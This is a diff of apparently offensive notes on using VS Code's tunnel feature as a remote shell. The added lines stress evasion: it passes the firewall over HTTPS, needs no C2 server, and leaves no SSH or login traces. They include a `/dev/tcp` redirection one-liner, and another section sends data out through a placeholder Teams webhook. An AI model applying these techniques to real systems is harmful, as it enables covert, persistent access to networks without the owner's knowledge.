@@ -2,19 +2,26 @@
 
 - Need
   - HTTP->TCP80 Open
-  - VsCode
+  - VsCode (you can install it !)
   - Code exec
   - Linux / Mac os
 
 - Why ?
+  - It's simpler   
   - Teams Webhook 443:HTTPS -> Firewall OK
   - HTTPS -> Confidentiality OK
   - Full interactivity shell (and a IDE !)
+  - URL hosted on ms
+  - No need C2 to manage session -> browser
   - VsCode
     - Possibly installed on computer with permission in enterprise (dev, sysadmin)
     - Mac os Binary Checker OK
     - `w` or `who` empty
     - No SSH, no telnet -> No log this service to
+
+## Exemple
+   
+`bash -c 'code tunnel >/dev/tcp/127.0.0.1/8080'`
 
 ## Big dummy version HTTP:80 encoded
 
@@ -144,7 +151,7 @@ rooooot /workspace # cat msg.txt | openssl enc -aes-256-cbc -d -a -pbkdf2 -iter 
 ...
 ```
 
-## Teams Webhook 
+## Chad Teams Webhook 
 
 ```
 WEBHOOK_URL="https://MY-TEAMS-WEBHOOK.COM" 
